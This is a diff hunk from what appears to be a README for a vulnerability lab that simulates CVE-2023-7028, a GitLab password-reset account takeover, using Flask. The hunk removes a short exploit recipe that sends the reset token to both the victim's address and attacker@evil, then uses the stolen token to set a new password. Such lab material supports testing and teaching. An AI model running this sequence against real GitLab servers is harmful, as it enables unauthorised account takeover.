@@ -23,14 +23,6 @@ every address in an attacker-supplied `user[email][]` array, and the token can
 then be used to change the victim's password (**real state change**). It is a
 simulation of CVE-2023-7028, not a real GitLab server.
 
-Exploit (unauthenticated):
-```
-POST /users/password   user[email][]=victim@x  user[email][]=attacker@evil
-# read the token from the attacker's own mailbox, then:
-POST /users/password   token=<stolen>  user[password]=<new>
-# log in as the victim with the new password
-```
-
 ## Affected Service
 - **Service:** GitLab CE 16.7.0 (simulated with Python/Flask)
 - **Ports:** 80/TCP
